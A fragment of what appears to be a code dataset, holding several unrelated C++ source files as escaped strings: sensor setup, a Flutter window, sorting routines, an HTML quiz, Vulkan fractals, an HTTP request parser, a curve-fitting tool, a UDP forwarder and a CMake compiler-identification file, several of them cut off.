if(writeRegister(GYRO_CONFIG,GYRO_FS_SEL_2000DPS) < 0){\n    return -8;\n  }\n  _gyroScale = 2000.0f/32767.5f * _d2r; // setting the gyro scale to 2000DPS\n  _gyroRange = GYRO_RANGE_2000DPS;\n  // setting bandwidth to 184Hz as default\n  if(writeRegister(ACCEL_CONFIG2,ACCEL_DLPF_184) < 0){ \n    return -9;\n  } \n  if(writeRegister(CONFIG,GYRO_DLPF_184) < 0){ // setting gyro bandwidth to 184Hz\n    return -10;\n  }\n  _bandwidth = DLPF_BANDWIDTH_184HZ;\n  // setting the sample rate divider to 0 as default\n  if(writeRegister(SMPDIV,0x00) < 0){ \n    return -11;\n  } \n  _srd = 0;\n  // enable I2C master mode\n  if(writeRegister(USER_CTRL,I2C_MST_EN) < 0){\n  \treturn -12;\n  }\n\t// set the I2C bus speed to 400 kHz\n\tif( writeRegister(I2C_MST_CTRL,I2C_MST_CLK) < 0){\n\t\treturn -13;\n\t}\n\t// check AK8963 WHO AM I register, expected value is 0x48 (decimal 72)\n\tif( whoAmIAK8963() != 72 ){\n    return -14;\n\t}\n  /* get the magnetometer calibration */\n  // set AK8963 to Power Down\n  if(writeAK8963Register(AK8963_CNTL1,AK8963_PWR_DOWN) < 0){\n    return -15;\n  }\n  delay(100); // long wait between AK8963 mode changes\n  // set AK8963 to FUSE ROM access\n  if(writeAK8963Register(AK8963_CNTL1,AK8963_FUSE_ROM) < 0){\n    return -16;\n  }\n  delay(100); // long wait between AK8963 mode changes\n  // read the AK8963 ASA registers and compute magnetometer scale factors\n  readAK8963Registers(AK8963_ASA,3,_buffer);\n  _magScaleX = ((((float)_buffer[0]) - 128.0f)/(256.0f) + 1.0f) * 4912.0f / 32760.0f; // micro Tesla\n  _magScaleY = ((((float)_buffer[1]) - 128.0f)/(256.0f) + 1.0f) * 4912.0f / 32760.0f; // micro Tesla\n  _magScaleZ = ((((float)_buffer[2]) - 128.0f)/(256.0f) + 1.0f) * 4912.0f / 32760.0f; // micro Tesla \n  // set AK8963 to P",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <algorithm>\n#include <format>\n#include \"ListOperationsKit.h\"\n\nvoid quick_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if(begin < end) {\n        int i = begin, j = end, pivot = list.get(begin);\n        do {\n            while (list[i] < pivot) ++i;\n            while (list[j] > pivot) --j;\n            if (i <= j) {\n                list.swap(i, j);\n                ++i;\n                --j;\n            }\n        } while(i <= j);\n        quick_sort(begin, j, list);\n        quick_sort(i, end, list);\n    }\n}\n\nvoid merge(int begin, int mid, int end, ListOperationsKit<int>& list) {\n    int i = begin, j = mid + 1, k = 0;\n    ListOperationsKit<int> temp;\n    while (i <= mid && j <= end) {\n        if (list.get(i) < list[j]) {\n            temp.append(list[i]);\n            ++i;\n        } else {\n            temp.append(list[j]);\n            ++j;\n        }\n    }\n    while (i <= mid) {\n        temp.append(list[i]);\n        ++i;\n    }\n    while (j <= end) {\n        temp.append(list[j]);\n        ++j;\n    }\n    for (int n = begin; n <= end; ++n) {\n        list[n] = temp[k];\n        ++k;\n    }\n}\n\nvoid merge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (begin < end) {\n        int mid = (begin + end) / 2;\n        merge_sort(begin, mid, list);\n        merge_sort(mid + 1, end, list);\n        merge(begin, mid, end, list);\n    }\n}\n\nvoid stooge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (list.get(begin) > list(end)) {\n        list.swap(begin, end);\n    }\n    if (end - begin + 1 > 2) {\n        int t = (end - begin + 1) / 3;\n        stooge_sort(begin, end - t, list);\n        stooge_sort(begin + t, end, list);\n        stooge_sort(begin, end - t, list);\n    }\n}\n\nint main() {\n    ListOperationsKit<int> list_1, list_2, list_3;\n\n    list_1.random_append(10);\n    list_2.random_append(10, 2, 50);\n    list_3.append(99, 53, 21, 8, 9, 10, 11, 12, 65, 94);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    std::cout << std::endl;\n\n    quick_sort(0, list_1.length(), list_1);\n    merge_sort(0, list_2.length(), list_2);\n    stooge_sort(0, list_3.length(), list_3);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <String>\r\n#include <conio.h>\r\n#include <windows.h>\r\nusing namespace std;\r\nstruct Info\r\n{\r\n    string nam;\r\n    char rollno[20];\r\n    int marks, random;\r\n};\r\nInfo st;\r\nvoid result()\r\n{\r\n    float percentage = 0;\r\n    cout << \"Student Name : \" << st.nam << endl;\r\n    cout << \"Roll no : \" << st.rollno << endl;\r\n    cout << \"Marks : \" << st.marks << \" Out of 10.\" << endl;\r\n    percentage = 100 * st.marks / 10;\r\n    cout << \"Percentage : \" << percentage << \"%\" << endl;\r\n    if (percentage >= 40)\r\n    {\r\n        cout << \"Status : PASS.\" << endl;\r\n    }\r\n    else\r\n    {\r\n        cout << \"Status : FAIL.\" << endl;\r\n    }\r\n    cout << \"*********************************************\" << endl;\r\n}\r\nvoid HTML()\r\n{\r\n    int i = 0, arr[10];\r\n    st.marks = 0;\r\n    char choice;\r\n    while (i < 10)\r\n    {\r\n    back:\r\n        st.random = rand() % 10;\r\n        for (int j = 0; j < 10; j++)\r\n        {\r\n            if (st.random == arr[j])\r\n            {\r\n                goto back;\r\n            }\r\n        }\r\n        arr[i] = st.random;\r\n        switch (st.random)\r\n        {\r\n        case 0:\r\n            cout << \"Q\" << i + 1 << \". What does HTML stands for ?\" << endl;\r\n            cout << \" A. Hyportext markup language\" << endl;\r\n            cout << \" B. Hypertext main language\" << endl;\r\n            cout << \" C. Hypertext markup language\" << endl;\r\n            cout << \" D. Hyporrtext markup language\" << endl;\r\n            cout << \"Your choice: \";\r\n            cin >> choice;\r\n            if (choice == 'C' || choice == 'c')\r\n            {\r\n                cout << choice << \" is correct answer\" << endl;\r\n                st.marks++;\r\n            }\r\n            else\r\n            {\r\n                cout << \"Incorrect answer!\" << endl;\r\n                cout << \"The correct answer is C\" << endl;\r\n            }\r\n            cout << \"******************************************************\" << endl;\r\n            break;\r\n        case 1:\r\n            cout << \"Q\" << i + 1 << \". Which tag is used to create hyperlink in HTML?\" << endl;\r\n            cout << \" A. <Link>\" << endl;\r\n            cout << \" B. <a>\" << endl;\r\n            cout << \" C. <hyperlink>\" << endl;\r\n            cout << \" D. <href>\" << endl;\r\n\r\n            cout << \"Your choice: \";\r\n            cin >> choice;\r\n            if (choice == 'B' || choice == 'b')\r\n            {\r\n                cout << choice << \" is correct answer\" << endl;\r\n                st.marks++;\r\n            }\r\n            else\r\n            {\r\n                cout << \"Incorrect answer!\" << endl;\r\n                cout << \"the correct answer is B\" << endl;\r\n            }\r\n            cout << \"******************************************************\" << endl;\r\n            break;\r\n        case 2:\r\n            cout << \"Q\" << i + 1 << \". What is the correct Html element for the largest heading?\" << endl;\r\n            cout << \" A. <heading>\" << endl;\r\n            cout << \" B. <h6>\" << endl;\r\n            cout << \" C. <head>\" << endl;\r\n            cout << \" D. <h1>\" << endl;\r\n\r\n            cout << \"Your choice: \";\r\n            cin >> choice;\r\n            if (choice == 'D' || choice == 'd')\r\n            {\r\n                cout << choice << \" is correct answer\" << endl;\r\n                st.marks++;\r\n            }\r\n            else\r\n            {\r\n                cout << \"Incorrect answer!\" << endl;\r\n                cout << \"The correct answer is d\" << endl;\r\n            }\r\n            cout << \"******************************************************\" << endl;\r\n            break;\r\n        case 3:\r\n            cout << \"Q\" << i + 1 << \". Which HTML tag is used to define a table row?\" << endl;\r\n            cout << \" A. <tr>\" << endl;\r\n            cout << \" B. <table>\" << endl;\r\n            cout << \" C. <row>\" << endl;\r\n            cout << \" D. <td>\" << endl;\r\n\r\n            cout << \"Your choice: \";\r\n            cin >> choice;\r\n            if (choice == 'A' || choice == 'a')\r\n            {\r\n                cout << choice << \" is correct answer\" << endl;\r\n                st.marks++;\r\n            }\r\n            else\r\n            {\r\n                cout << \"Incorrect answer!\" << endl;\r\n                cout << \"the correct answer is a\" << endl;\r\n            }\r\n            cout << \"******************************************************\" << endl;\r\n            break;\r\n        case 4:\r\n            cout << \"Q\" << i + 1 << \". Which tag is used to define the footer of a webpage?\" << endl;\r\n            cout << \" A. <footer>\" << endl;\r\n            cout << \" B. <bottom>\" << endl;\r\n            cout << \" C. <end>\" << endl;\r\n            cout << \" D. <foot>\" << endl;\r\n\r\n            cout << \"Your choice: \";\r\n            cin >> choice;\r\n            if (choice == 'A' || choice == 'a')\r\n            {\r\n                cout << choice << \" is correct answer\" << endl;\r\n                st.marks++;\r\n            }\r\n            else\r\n            {\r\n                cout << \"Incorrect answer!\" << endl;\r\n                cout << \"the corre",
    "#include \"first_app.h\"\n\n// Standard Libraries\n#include <stdexcept>\n#include <array>\n\nnamespace vkm {\n\n\tFirstApp::FirstApp() {\n\t\tloadModels();\n\t\tcreatePipelineLayout();\n\t\trecreateSwapChain();\n\t\tcreateCommandBuffers();\n\t}\n\n\tFirstApp::~FirstApp() {\n\t\tvkDestroyPipelineLayout(vkmDevice.device(), pipelineLayout, nullptr);\n\t}\n\n\tvoid FirstApp::run() {\n\n\t\twhile (!vkmWindow.shouldClose()) {\n\t\t\tglfwPollEvents();\n\t\t\tdrawFrame();\n\t\t}\n\t\t\n\t\tvkDeviceWaitIdle(vkmDevice.device());\n\t}\n\n\t// From Brendan Galea\n\tvoid FirstApp::sierpinski(\n\t\tstd::vector<VkmModel::Vertex> &vertices,\n\t\tint depth,\n\t\tglm::vec2 left,\n\t\tglm::vec2 right,\n\t\tglm::vec2 top) {\n\t\tif (depth <= 0) {\n\t\t\tvertices.push_back({ top });\n\t\t\tvertices.push_back({ right });\n\t\t\tvertices.push_back({ left });\n\t\t}\n\t\telse {\n\t\t\tauto leftTop = 0.5f * (left + top);\n\t\t\tauto rightTop = 0.5f * (right + top);\n\t\t\tauto leftRight = 0.5f * (left + right);\n\t\t\tsierpinski(vertices, depth - 1, left, leftRight, leftTop);\n\t\t\tsierpinski(vertices, depth - 1, leftRight, right, rightTop);\n\t\t\tsierpinski(vertices, depth - 1, leftTop, rightTop, top);\n\t\t}\n\t}\n\n\tvoid FirstApp::kochSnowflake(\n\t\tstd::vector<VkmModel::Vertex>& vertices,\n\t\tint depth,\n\t\tglm::vec2 start,\n\t\tglm::vec2 end,\n\t\tfloat width = 0.01f) {  // width of the line as a very small value\n\t\tif (depth == 0) {\n\t\t\tglm::vec2 normal = glm::normalize(glm::vec2(end.y - start.y, -(end.x - start.x))) * width;\n\n\t\t\tglm::vec2 v1 = start + normal;\n\t\t\tglm::vec2 v2 = start - normal;\n\t\t\tglm::vec2 v3 = end + normal;\n\t\t\tglm::vec2 v4 = end - normal;\n\n\t\t\t// First triangle\n\t\t\tvertices.push_back({ v1 });\n\t\t\tvertices.push_back({ v2 });\n\t\t\tvertices.push_back({ v3 });\n\n\t\t\t// Second triangle\n\t\t\tvertices.push_back({ v2 });\n\t\t\tvertices.push_back({ v4 });\n\t\t\tvertices.push_back({ v3 });\n\t\t}\n\t\telse {\n\t\t\tglm::vec2 vec = end - start;\n\t\t\tglm::vec2 third1 = start + vec / 3.0f;\n\t\t\tglm::vec2 third2 = start + 2.0f * vec / 3.0f;\n\n\t\t\t// Calculate the point that forms the peak of the \"bump\"\n\t\t\tfloat angle = glm::radians(60.0f); // 60 degrees for equilateral triangle\n\t\t\tglm::vec2 peak = third1 + glm::vec2(\n\t\t\t\tcos(angle) * (third2.x - third1.x) - sin(angle) * (third2.y - third1.y),\n\t\t\t\tsin(angle) * (third2.x - third1.x) + cos(angle) * (third1.y - third2.y)\n\t\t\t);\n\n\t\t\tkochSnowflake(vertices, depth - 1, start, third1, width);\n\t\t\tkochSnowflake(vertices, depth - 1, third1, peak, width);\n\t\t\tkochSnowflake(vertices, depth - 1, peak, third2, width);\n\t\t\tkochSnowflake(vertices, depth - 1, third2, end, width);\n\t\t}\n\t}\n\n\tvoid FirstApp::loadModels() {\n\t\t/* std::vector<VkmModel::Vertex> vertices;\n\t\tglm::vec2 v1 = { -0.5f, -0.3f };\n\t\tglm::vec2 v2 = { 0.5f, -0.3f };\n\t\tglm::vec2 v3 = { 0.0f, 0.6f };\n\n\t\tfloat lineWidth = 0.005f;\n\t\tkochSnowflake(vertices, 4, v1, v2, lineWidth);\n\t\tkochSnowflake(vertices, 4, v2, v3, lineWidth);\n\t\tkochSnowflake(vertices, 4, v3, v1, lineWidth); */\n\t\tstd::vector<VkmModel::Vertex> vertices{\n\t\t\t{ {0.0f, -0.5f}, {1.0f, 0.0f, 0.0f} },\n\t\t\t{ {0.5f, 0.5f},  {0.0f, 1.0f, 0.0f} },\n\t\t{ {-0.5f, 0.5f}, {0.0f, 0.0f, 1.0f} }};\n\n\t\tvkmModel = std::make_unique<VkmModel>(vkmDevice, vertices);\n\t}\n\n\tvoid FirstApp::createPipelineLayout() {\n\t\tVkPipelineLayoutCreateInfo pipelineLayoutInfo{};\n\t\tpipelineLayoutInfo.sType = VK_STRUCTURE_TYPE_PIPELINE_LAYOUT_CREATE_INFO;\n\t\tpipelineLayoutInfo.setLayoutCount = 0;\n\t\tpipelineLayoutInfo.pSetLayouts = nullptr;\n\t\tpipelineLayoutInfo.pushConstantRangeCount = 0;\n\t\tpipelineLayoutInfo.pPushConstantRanges = nullptr;\n\t\tif (vkCreatePipelineLayout(vkmDevice.device(), &pipelineLayoutInfo, nullptr, &pipelineLayout) !=\n\t\t\tVK_SUCCESS) {\n\t\t\tthrow std::runtime_error(\"Failed to create pipeline layout!\");\n\t\t}\n\t}\n\n\tvoid FirstApp::createPipeline() {\n\t\tassert(vkmSwapChain != nullptr && \"Cannot create pipeline before swap chain\");\n\t\tassert(pipelineLayout != nullptr && \"Cannot create pipeline before pipeline layout\");\n\t\t// auto pipelineConfig =\n\t\t\t// VkmPipeline::defaultPipelineConfigInfo(vkmSwapChain->width(), vkmSwapChain->height());\n\t\tPipelineConfigInfo pipelineConfig{};\n\t\tVkmPipeline::defaultPipelineConfigInfo(pipelineConfig);\n\t\tpipelineConfig.renderPass = vkmSwapChain->getRenderPass();\n\t\tpipelineConfig.pipelineLayout = pipelineLayout;\n\t\tvkmPipeline = std::make_unique<VkmPipeline>(\n\t\t\tvkmDevice,\n\t\t\t\"src/shaders/simple_shader.vert.spv\",\n\t\t\t\"src/shaders/simple_shader.frag.spv\",\n\t\t\tpipelineConfig);\n\t}\n\n\tvoid FirstApp::recreateSwapChain() {\n\t\tauto extent = vkmWindow.getExtent();\n\t\twhile (extent.width == 0 || extent.height == 0) { // This occurs when minimizing the window\n\t\t\textent = vkmWindow.getExtent();\n\t\t\tglfwWaitEvents();\n\t\t}\n\t\tvkDeviceWaitIdle(vkmDevice.device());\n\t\tif (vkmSwapChain == nullptr) {\n\t\t\tvkmSwapChain = std::make_unique<VkmSwapChain>(vkmDevice, extent);\n\t\t}\n\t\telse {\n\t\t\tvkmSwapChain = std::make_unique<VkmSwapChain>(vkmDevice, extent, std::move(vkmSwapChain));\n\t\t\tif (vkmSwapChain->imageCount() != commandBuffers.size()) {\n\t\t\t\tfreeCommandBuffers();\n\t\t\t\tcreateCommandBuffers();\n\t\t\t}\n\t\t}\n\n\n\t\t// if render pass is compatible then we can do nothing here\n\t\tcreatePipeline();\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   HTTPRequestParser.cpp                              :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: erivero- <erivero-@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/04/06 14:45:31 by migarci2          #+#    #+#             */\n/*   Updated: 2024/05/07 17:43:34 by erivero-         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"HTTPRequestParser.hpp\"\n#include <iostream>\n\nvoid\tHTTPRequestParser::parseRequestLine(HTTPRequest &request, const std::string &requestLine)\n{\n\tstd::string::size_type start = 0;\n\tstd::string::size_type end = requestLine.find(' ');\n\n\tif (end == std::string::npos)\n\t\tthrow InvalidRequestHeader();\n\n\trequest.setMethod(HTTPRequest::getMethodFromString(requestLine.substr(start, end - start)));\n\tstart = end + 1;\n\tend = requestLine.find(' ', start);\n\tif (end == std::string::npos)\n\t\tthrow InvalidRequestHeader();\n\trequest.setUri(requestLine.substr(start, end - start));\n//    std::cout << request.getUri() << std::endl;\n\trequest.setQuery(parseQueryString(request.getUri()));\n\tstart = end + 1;\n\trequest.setHttpVersion(requestLine.substr(start));\n}\n\nconst std::string HTTPRequestParser::parseQueryString(const std::string &uri)\n{\n    std::string::size_type start = uri.find('?');\n    if (start != std::string::npos)\n        return (uri.substr(start + 1));\n    else\n        return (\"\");\n}\n\nvoid\tHTTPRequestParser::parseRequestHeaders(HTTPRequest &request, const std::string &headerLine)\n{\n\tstd::string::size_type end = headerLine.find(':');\n\tif (end == std::string::npos)\n\t\tthrow InvalidRequestHeader();\n\tstd::string key = headerLine.substr(0, end);\n\tstd::string value = headerLine.substr(end + 2);\n\trequest.addHeader(key, value);\n}\n\nHTTPRequest HTTPRequestParser::parseRequest(const std::string &rawRequest)\n{\n    HTTPRequest request;\n    std::string::size_type headerEnd = rawRequest.find(\"\\r\\n\\r\\n\");\n    if (headerEnd == std::string::npos)\n        throw InvalidRequestLine();\n\n    std::string headersPart = rawRequest.substr(0, headerEnd);\n    std::string::size_type start = 0;\n    std::string::size_type end = headersPart.find(\"\\r\\n\");\n\n    parseRequestLine(request, headersPart.substr(start, end - start));\n    start = end + 2;\n    while (start < headerEnd)\n\t{\n        end = headersPart.find(\"\\r\\n\", start);\n        if (end == std::string::npos)\n            end = headerEnd;\n        if (start == end)\n            break;\n        parseRequestHeaders(request, headersPart.substr(start, end - start));\n        start = end + 2;\n    }\n    if (headerEnd + 4 < rawRequest.size())\n        request.setBody(rawRequest.substr(headerEnd + 4));\n    return request;\n}\n\nconst char *HTTPRequestParser::InvalidRequestLine::what() const throw()\n{\n\treturn \"Invalid request line\";\n}\n\nconst char *HTTPRequestParser::InvalidRequestHeader::what() const throw()\n{\n\treturn \"Invalid request header\";\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include \"UniformSampler.hpp\"\n#include \"ModelFunctions.hpp\"\n#include <memory>\n/**\n * @brief: This function prints out a help message that helps the user use the Sample2D application.\n*/\nvoid HelpMessage(){\n    std::cout << \"This program uses uniform sampling to fit data to the equation y = ax^b with default parameter ranges from 0 to 5. \\nThe data should come in the format of a txt file with columns inputs (x), outputs (y) or error (\u03c3).\\n\\nBrief instructions can be found below.\" << std::endl;\n    std::cout << \"Usage: Sample2D -f <file_path> -n <number_of_bins>\\n\"\n              << \"Options:\\n\"\n              << \"  -h                Show this help message\\n\"\n              << \"  -f  <path>        Path to the data file\\n\"\n              << \"  -n  <bins>        Number of bins for sampling\\n\"\n              << \"  -ar <upper,lower> Range for parameter a             (optional: default = 0,5)\\n\"\n              << \"  -br <upper,lower> Range for parameter b             (optional: default = 0,5)\\n\"\n              << \"  -p  <plot>        Plot condition (Y/N)              (optional: default = Y)\\n\"\n              << \"  -g  <rigidity>    Strictness when Reading Data File (optional: default = false)\" << std::endl;\n}\n// finds index of comma in string and then uses it as delimiter to split into two substrings. Converts string to double after.\nstd::array<double,2> split(std::string ranges){\n    uint idx_comma = 0;\n    for (uint i = 0; i < ranges.size(); i++){\n        if (ranges[i] == ','){\n            idx_comma = i;\n        }\n    }\n    std::string upper = \"\";\n    std::string lower = \"\";\n    for (uint i = 0; i < ranges.size(); i++){\n        if (i < idx_comma){\n            lower += ranges[i];\n        }\n        else if (i > idx_comma){\n            upper += ranges[i];\n        }\n        else{\n            continue;\n        }\n    }\n    return {std::stod(lower), std::stod(upper)};\n}\n\n\nint main(int argc, char** argv)\n{\n    std::string filepath;\n    uint num_bins = 0;\n    bool rigidity = false;\n    bool filepath_set = false;\n    bool num_bins_set = false;\n    bool a_range_set = false; // track if values have been set already. std::optional could also have been used here however this approach is simpler as some conditions have default values.\n    bool b_range_set = false;\n    bool rigidity_set = false;\n    bool plot_condition = true;\n    bool plot_condition_set = false;\n    std::array<double,2> a_range;\n    std::array<double, 2> b_range;\n\n    for (int i = 1; i < argc; i+=2){ // check for flags\n        std::string arg(argv[i]);\n        if (arg == \"-h\"){\n            HelpMessage();\n            return 0;\n        }\n        else if (arg == \"-f\") {\n            if (filepath_set){\n                std::cerr << \"Error - Cannot set filepath twice!\" << std::endl; // check for clashes caused by setting the same value to different conditions. \n                HelpMessage();\n                return 1;\n            }\n            std::string arg1(argv[i+1]);\n            filepath = arg1;\n            filepath_set = true;\n        }\n        else if (arg == \"-n\"){\n            if (num_bins_set){\n                std::cerr << \"Error - Cannot set the number of bins twice!\" << std::endl;\n                HelpMessage();\n                return 1;\n            }\n            std::string arg1(argv[i+1]);\n            num_bins = std::atoi(arg1.c_str());\n            num_bins_set = true;\n        }\n        else if (arg == \"-g\"){\n            if (rigidity_set){\n                std::cerr << \"Error - Cannot set the rigidity twice!\" << std::endl;\n                HelpMessage();\n                return 1;\n            }\n            std::string arg1(argv[i+1]);\n            if ((arg1 == \"True\") || (arg1 == \"true\")){\n                rigidity = true;\n                rigidity_set = true;\n            }\n            else if((arg1 == \"False\") || (arg1 == \"false\")){\n                rigidity = false;\n                rigidity_set = true;\n            }\n            else{\n                std::cerr << \"Error - please input valid rigidity setting!\" << std::endl;\n                HelpMessage();\n                return 1;\n            }\n        } // error handling \n        else if (arg == \"-ar\"){ \n            if (a_range_set){\n                std::cerr << \"Error - the range of parameter a has already been set!\" << std::endl;\n                HelpMessage();\n                return 1;\n            }\n            std::string arg1(argv[i+1]);\n            try{\n                a_range = split(arg1.c_str());   // test operation for parameter a.\n            }\n            catch(const std::invalid_argument&){\n                std::cerr << \"Error - the range of parameter a has had incorrect inputs!\" << std::endl;\n                HelpMessage();\n                return 1;\n            }\n            \n            a_range_set = true;\n        }\n        else if (arg == \"-br\"){\n            if (b_range_set){\n                std::cerr << \"Error - the range of parameter b has already been set!\" << std::e",
    "#include <iostream>\n\n#include <errno.h>\n#include <string.h>\n\n#include \"common_logger.h\"\n#include \"common_utils.h\"\n#include \"io_utils.h\"\n#include \"io_socket_handler_mgr.h\"\n#include \"io_udp_carrier.h\"\n#include \"app_forward.h\"\n\nAppLogger *g_pLogger = NULL;\nint g_log_level = LOG_LEVEL_VERBOSE;\n\nint main()\n{\n\tUdpCarrierHandler* udpCarrier = nullptr;\n\tAppForward* appForward = nullptr;\n\tbool cycle = false;\n\tbool ret = false;\n\n    if (!check_path_exists(\"/home/lijian/testlog\"))\n\t{\n\t\tstd::cout << \"/home/lijian/testlog does not exists, create recursively\" << std::endl;\n\t\tbool createRet = create_directory_recursively(\"/home/lijian/testlog\");\n\t\tstd::cout << \"create /home/lijian/testlog returns:\" << createRet << std::endl;\n\t\tif(!createRet)\n\t\t{\n\t\t\tstd::cout << \"mkdir returns: \" << strerror(errno) << std::endl;\n\t\t}\n\t}\n\n\tAppLogger *pLogger = new AppLogger(\"logger\");\n\tif (pLogger)\n\t{\n\t\tret = pLogger->initialize(\"/home/lijian/testlog\", false, 1024 * 5, 10);\n\t\tstd::cout << \"AppLogger::initialize(): \" << ret << std::endl;\n\t}\n\tg_pLogger = pLogger;\n\n\tLOG_INFO(\"Program begins.......\");\n\n\tstd::cout << \"epoll supported: \" << is_epoll_supported() << std::endl;\n\n\t//the udp carrier lifetime is managed by IOSocketHandlerMgr\n\tudpCarrier = UdpCarrierHandler::create(\"0.0.0.0\", 30002, 64, 64);\n\tif(!udpCarrier)\n\t{\n\t\tstd::cout << \"Create UDP Carrier failed\" << std::endl;\n\t\tgoto exitFlag;\n\t}\n\n\tappForward = new AppForward();\n\tif(!appForward)\n\t{\n\t\tstd::cout << \"Create AppForward failed\" << std::endl;\n\t\tgoto exitFlag;\n\t}\n\n\tudpCarrier->set_udp_protocol(appForward);\n\tappForward->set_udp_carrier(udpCarrier);\n\n    ret = IOSocketHandlerMgr::init();\n    if(!ret)\n    {\n        std::cout << \"IOSocketHandlerMgr::init() error occurs. \" << std::endl;\n        return 0;\n    }\n\n\tudpCarrier->add_destination(\"192.168.0.100\", 32000);\n\tret = udpCarrier->start();\n\tif(!ret)\n\t{\n\t\tstd::cout << \"udpCarrier->start() error occurs. \" << std::endl;\n\t}\n\n    do\n    {\n        cycle = IOSocketHandlerMgr::cycle();\n        IOSocketHandlerMgr::delete_inactive_handlers();\n        \n    }while(cycle);\n\n    IOSocketHandlerMgr::close_all_iohandlers();\n    IOSocketHandlerMgr::delete_inactive_handlers();\n\n    ret = IOSocketHandlerMgr::shutdown();\n\nexitFlag:\n\n    LOG_INFO(\"Program ends.......\");\n\n\tif(appForward)\n\t{\n\t\tdelete appForward;\n\t}\n\n\tif (g_pLogger)\n\t{\n\t\tg_pLogger->uninitialize();\n\t\tdelete g_pLogger;\n\t}\n\n\tstd::cin.get();\n\n    return 0;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && 